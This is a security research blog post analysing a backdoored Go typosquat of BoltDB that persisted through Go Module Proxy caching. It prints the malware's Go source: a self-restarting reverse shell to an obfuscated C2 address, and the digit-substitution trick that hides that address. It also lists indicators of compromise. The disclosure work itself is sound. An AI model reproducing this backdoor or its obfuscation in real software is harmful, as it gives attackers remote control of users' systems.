---
source_url: https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence
ingested: 2026-09-12
sha256: 3dca3d8e88fea1813bbefdbf5bff98a6702d91694f19710784a20a28deb3d373
---
# Go Supply Chain Attack: Malicious Package Exploits Go Module Proxy Caching for Persistence

Book a Demo Get Started

## Security that keeps pace with AI development

What is Socket?

npm

Try "react" or "express"

to navigate

·

to select

·More tips

Back

Research Security News

# Go Supply Chain Attack: Malicious Package Exploits Go Module Proxy Caching for Persistence

Socket researchers uncovered a backdoored typosquat of BoltDB in the Go ecosystem, exploiting Go Module Proxy caching to persist undetected for years.

- 
Kirill Boychenko

Feb 4, 2025|9 min read

Export IOCs1

Socket researchers have discovered a malicious typosquat package in the Go ecosystem, impersonating the widely used `BoltDB` database module (github.com/boltdb/bolt), a tool trusted by many organizations including Shopify and Heroku. The `BoltDB` package is widely adopted within the Go ecosystem, with 8,367 other packages depending on it. Its extensive use across thousands of projects positions `BoltDB` among the most prominent and trusted modules in the Go community.

The malicious package github.com/boltdb-go/bolt contains a backdoor that enables remote code execution, allowing a threat actor to control infected systems via a command and control (C2) server. After the malware was cached by the Go Module Mirror, which the Go CLI toolchain downloads from, the `git` tag was strategically altered on GitHub to remove traces of malware, hiding it from manual code review.

As of this publication, the malicious package remains available on the Go Module Proxy. We have petitioned its removal from the module mirror and have also reported the threat actor’s GitHub repository and account, which were used to distribute the backdoored `boltdb-go` package.

This attack is among the first documented instances of a malicious actor exploiting the Go Module Mirror’s indefinite caching of modules. While no prior cases have been reported publicly, this incident highlights a critical need to raise awareness of similar persistence tactics in the future. With immutable modules offering both security benefits and potential abuse vectors, developers and security teams should monitor for attacks that leverage cached module versions to evade detection.

## Stealthy Go Supply Chain Attack: From Typosquatting to Persistence#

The threat actor, using the GitHub alias “boltdb-go”, initially published a malicious version `v1.3.1` to GitHub, which was then cached indefinitely by the Go Module Mirror service. Once the package was cached, they rewrote the GitHub tag to point to a clean, legitimate version, ensuring that a manual audit of the GitHub repository would not reveal any malicious content. However, due to Go’s caching mechanism, developers installing the package using the `go` CLI continued to download the cached malicious version from the Go Module Mirror, rather than the updated, benign version.

> The threat actor created a malicious package that typosquatted the legitimate `BoltDB`. Once installed, the backdoored package grants the threat actor remote access to the infected system, allowing them to execute arbitrary commands. The malicious package was uploaded to the Go Module Proxy in November 2021.

> The legitimate `BoltDB` package is widely used and highly trusted by developers across the Go programming language ecosystem.

In the Go programming ecosystem, the Go Module Proxy service functions as an intermediary, caching and serving Go packages (modules) to developers. This caching mechanism enhances efficiency and reliability in module retrieval, and protects user machines from zero-day `git` client exploits. By default, when developers use Go’s command-line tools to download or install packages, their requests are automatically routed through this proxy service.

### Here is how this supply chain attack unfolded:#

1. The threat actor created a malicious Go package with a name closely resembling the legitimate `boltdb/bolt` package, choosing `boltdb-go/bolt`. This subtle naming variation was designed to mislead developers into selecting the malicious package, either through typographical errors or by mistake.
2. The malicious package was published to a public repository, triggering the Go Module Proxy service to fetch and cache the package upon its first request. Once cached, the package became persistently available for subsequent downloads.
3. After ensuring the malicious package was cached by the Go Module Proxy, the threat actor modified the `Git` tags in the source repository, redirecting them to a benign, legitimate version. This deceptive tactic ensured that a manual inspection of the GitHub repository would not reveal traces of malware, while the Go Module Proxy continued serving the cached malicious version to unsuspecting developers. Notably, the `.info` file for the malicious module on the Go Module Mirror lacked the resolved `Git` commit SHA references that would typically link back to the malicious code in the GitHub repository.

This sequence of actions enabled the threat actor to exploit the Go Module Proxy’s caching mechanism, ensuring that the malicious package remained available to developers, even after the repository’s tags were modified.

> An image of the threat actor-controlled GitHub repository, designed to impersonate the legitimate `boltdb/bolt` repository.

> An image of the legitimate `boltdb/bolt` GitHub repository. Because the canonical repository for this project has been archived, developers are driven to create or adopt active forks, which in turn raises the risk of malicious or unauthorized modifications being introduced to unsuspecting end-users.

The success of this attack relied on the design of the Go Module Proxy service, which prioritizes caching for performance and availability. Once a module version is cached, it remains accessible through the Go Module Proxy, even if the original source is later modified. While this design benefits legitimate use cases, the threat actor exploited it to persistently distribute malicious code despite subsequent changes to the repository.

### Why Go Modules Are Immutable#

Go modules are intentionally immutable once published and fetched by the proxy, ensuring that every user pulling a tagged version (e.g., `v1.2.3`) receives the exact same bits every time, and preventing silent changes or overwrites after publication. This immutability underpins Go’s reproducible builds, helping guarantee that build outputs always match the associated source code.

It also offers security advantages: if a library is later compromised, it cannot silently replace code that was already downloaded. Because the system will detect any mismatch with the recorded checksum in `go.sum`, attempts to alter a previously fetched version will cause the build to fail.

While immutability can be abused by malicious actors — allowing harmful code to persist once cached — it remains a net security benefit. Since the Go module system is functioning as intended, and this is not a security vulnerability, there is no patch or switch to turn off immutability; instead, developers must recognize that once a malicious version is published, it will remain malicious in the cache.

In 2024, community assessments have drawn attention to a caching-based risk in the Go Module Proxy. One report detailed legal and operational issues arising from the proxy’s default behavior of automatically caching packages from public repositories. Another assessment highlighted that this caching behavior could potentially be exploited to serve compromised or malicious modules, regardless of any subsequent cleanup in the upstream source.

Developers who manually audited `github.com/boltdb-go/bolt` on GitHub found no traces of malicious code. However, downloading the package via the Go Module Proxy proxy.golang.org still retrieved the original backdoored version. This deception went undetected for over three years, allowing the malicious package to persist despite appearing clean in the public repository.

> Socket AI Scanner identified `boltdb-go/bolt` package as malicious providing the following context: “This file includes an `Apilnit` function that attempts to connect continuously to a hidden domain (e.g., example[.]com) and executes shell commands received from the connection without validation. The `_r` function masks the actual domain or address being contacted, increasing suspicion. These capabilities present a serious risk of unauthorized remote code execution”.

We identified another typosquatted Go package, github.com/bolt-db/bolt, also impersonating the legitimate `BoltDB` package. While this package does not contain malicious code, we have petitioned for its removal from the module mirror to prevent potential misuse.

Additionally, we have reported the associated GitHub repository and account to mitigate the risk of future exploitation. Forking an archived repository is not inherently malicious and can pave the way for legitimately maintained forks. However, in this instance, the fork is largely inactive, yet retains a closely matching name and appears in searches for the canonical project. This highlights the importance of using caution when handling archived repositories, which may still draw users and contributors years after official maintenance has ended.

## Backdoor Implementation#

The `boltdb-go/bolt` package is a trojanized version of the legitimate `BoltDB` package, containing a covert remote access backdoor embedded within otherwise legitimate database functionality. The malicious code is designed to persistently connect to a remote C2 server at an obfuscated IP address `49.12.198[.]231:20022`. Once connected, it listens for commands, executes them on the host system, and returns the output to the threat actor. This effectively grants an unauthorized remote user full control over any system running this package.

The following malicious code snippets from the `db.go` file have been annotated with comments to highlight the threat actor’s techniques for establishing and activating a hidden backdoor.

Go

`func ApiInit() {
go func() {
defer func() {
// Persistence mechanism:
// If the function panics (e.g. connection loss), restart after 30 seconds
if r := recover(); r != nil {
time.Sleep(30 * time.Second)
ApiInit()
}
}()

```
    for {
        d := net.Dialer{Timeout: 10 * time.Second}

        // Obfuscated C2 connection:  
        // Constructs a hidden IP address and port using _r()
        conn, err := d.Dial("tcp", _r(strconv.Itoa(MaxMemSize) + strconv.Itoa(MaxIndex) + ":" + strconv.Itoa(MaxPort)))
        if err != nil {
            // Stealth:
            // If the connection fails, retry in 30 seconds to avoid immediate detection
            time.Sleep(30 * time.Second)
            continue
        }

        // Remote command execution loop  
        // Reads incoming commands and executes them
        for {
            message, _ := bufio.NewReader(conn).ReadString('\n')
            args, err := shellwords.Parse(strings.TrimSuffix(message, "\n"))
            if err != nil {
                fmt.Fprintf(conn, "Parse err: %s\n", err)
                continue
            }

            // Execution of arbitrary shell commands  
            var out []byte
            if len(args) == 1 {
                out, err = exec.Command(args[0]).Output()
            } else {
                out, err = exec.Command(args[0], args[1:]...).Output()
            }

            // Exfiltration:  
            // Sends the command output or error back to the threat actor
            if err != nil {
                fmt.Fprintf(conn, "%s\n", err)
            }
            fmt.Fprintf(conn, "%s\n", out)
        }
    }
}()

```

}`

The following malicious code snippets from the `cursor.go` file have been annotated with comments to illustrate the threat actor’s techniques for obfuscating values, which are later manipulated to construct an IP address.

Go

`const ( MaxMemSize = 64966512577 // Obfuscated IP part MaxIndex = 6179852731 // Obfuscated IP part MaxPort = 2060272 // Obfuscated port )`

These constants are combined and transformed using `_r()`.

Go

`func _r(s string) string {
// String manipulation / obfuscation
// Replaces '5' with '.' and removes '6' and '7' to disguise the C2 address

```
ret := strings.ReplaceAll(s, "5", ".")
ret = strings.ReplaceAll(ret, "6", "")
ret = strings.ReplaceAll(ret, "7", "")
return ret

```

}`

Original value before transformation:

Go

`"649665125776179852731:2060272"`

Transformation process: `'5'` → `'.'` while `'6'` and `'7'` are removed, resulting in the final output below.

Go

`"49.12.198[.]231:20022"`

The malicious functionality is distributed across multiple files within the `boltdb-go/bolt` package to evade detection, with `db.go` initiating the backdoor connection while `cursor.go` discreetly introduces misleading constants that are later transformed into an obfuscated IP address. The `_r()` function dynamically reconstructs the threat actor’s C2 address, ensuring that standard static analysis tools cannot easily identify or flag the malicious infrastructure. The backdoor activates when a developer calls `Open()`, establishing a persistent TCP connection to `49.12.198[.]231:20022`, where it awaits and executes arbitrary shell commands from the threat actor. Additionally, a built-in reinitialization routine ensures that if the backdoor crashes or fails, it automatically restarts itself, maintaining continuous access to the compromised system.

The threat actor’s use of a clean, unflagged IP hosted on Hetzner Online GmbH (AS24940) indicates a high level of operational security, suggesting that this infrastructure was procured specifically for this campaign to avoid premature detection and blocklisting. Unlike indiscriminate malware, this backdoor is designed to blend into trusted development environments, increasing the likelihood of widespread compromise before discovery.

## Outlook and Recommendations#

The Go programming language is celebrated for its efficiency, simplicity, and powerful module ecosystem. However, as this incident demonstrates, the same mechanisms that enable seamless package distribution can also be exploited for software supply chain attacks. The abuse of the Go Module Proxy’s caching mechanism allowed a malicious package to persist undetected for years. This underscores the need for proactive security measures in open-source ecosystems, where traditional auditing methods may fail to detect sophisticated threats.

Socket’s AI scanner plays a crucial role in identifying malicious code before it can infiltrate software supply chains. By analyzing the actual installed package contents — rather than relying solely on code repositories — the scanner detects obfuscated code, unexpected network activity, and unauthorized command execution. In this case, Socket’s AI scanner flagged the malicious `boltdb-go/bolt` package for its hidden backdoor, highlighting the importance of inspecting what actually gets installed, not just what appears in the repository.

To mitigate supply chain threats, developers should verify package integrity before installation, analyze dependencies for anomalies, and use security tools that inspect installed code at a deeper level. Ensuring that Go’s module ecosystem remains resilient against such attacks requires ongoing vigilance, improved security mechanisms, and better awareness of how threat actors exploit software distribution channels.

Socket’s GitHub app enables real-time monitoring of pull requests, flagging suspicious or malicious packages before they are merged. Running the Socket CLI during Go installations or builds provides an additional layer of security by analyzing dependency files (`go.mod` and `go.sum`) and identifying anomalies, suspicious behavior, and potential security risks in open-source dependencies before they are incorporated into a project. Additionally, using the Socket browser extension provides on-the-fly protection by analyzing browsing activity and alerting users to potential threats before they download or interact with malicious content. By integrating these security measures into development workflows, organizations can significantly reduce the likelihood of supply chain attacks.

## Indicators of Compromise (IOCs)#

- Malicious Go Package: `github.com/boltdb-go/bolt`
- Threat Actor GitHub Alias: `boltdb-go`
- C2 Server: `49.12.198[.]231:20022`

## MITRE ATT&CK Techniques#

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1027 — Obfuscated Files or Information
- T1571 — Non-Standard Port

Socket Firewall

Blocks risky dependencies before they reach your environment

Get Started Free

View all posts

Stay ahead of threats

## Subscribe to our newsletter

Get notified when we publish new security blog posts!

Enter your email

```json
{"@context":"https://schema.org","@type":"NewsArticle","author":{"@type":"Person","name":"Kirill Boychenko","image":"https://cdn.sanity.io/images/cgdhsj6q/production/07372dc1581f6b0fed6246998585bccd6d3d4e5c-800x800.jpg?w=1600&q=95&fit=max&auto=format"},"datePublished":"2025-02-04T02:45:37.295Z","description":"Socket researchers uncovered a backdoored typosquat of BoltDB in the Go ecosystem, exploiting Go Module Proxy caching to persist undetected for years.","headline":"Go Supply Chain Attack: Malicious Package Exploits Go Module Proxy Caching for Persistence","mainEntityOfPage":{"@type":"WebPage","@id":"https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://socket.dev/apple-touch-icon.png"},"name":"Socket"},"url":"https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence","image":["https://cdn.sanity.io/images/cgdhsj6q/production/e387a9011a558af6f1f17eb9e7e309e1e0947f3b-1024x1024.jpg?w=1200&q=95&fit=max&auto=format"]}

```
